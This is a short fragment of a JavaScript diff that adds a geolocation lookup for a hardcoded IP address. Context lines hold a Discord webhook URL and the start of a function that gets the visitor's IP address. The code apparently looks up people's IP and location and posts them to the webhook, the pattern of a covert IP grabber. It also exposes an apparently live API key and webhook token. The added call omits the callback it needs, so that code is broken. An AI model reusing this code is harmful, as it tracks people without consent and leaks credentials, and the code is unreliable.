@@ -1,3 +1,18 @@
+
+              function httpGetAsync(url, callback) {
+                  const xmlHttp = new XMLHttpRequest();
+                  xmlHttp.onreadystatechange = function() {
+                      if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
+                      callback(xmlHttp.responseText);
+                  }
+                  xmlHttp.open("GET", url, true); // true for asynchronous
+                  xmlHttp.send(null);
+              }
+
+              const url = "https://ipgeolocation.abstractapi.com/v1/?api_key=9ed8eefc86024c67b341a5ace0b43e1c&ip_address=2001:861:4282:71d0:b5a4:20d7:e8c3:434c"
+
+              httpGetAsync(url)
+
 const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
 
 const getIpAddress = async () => {
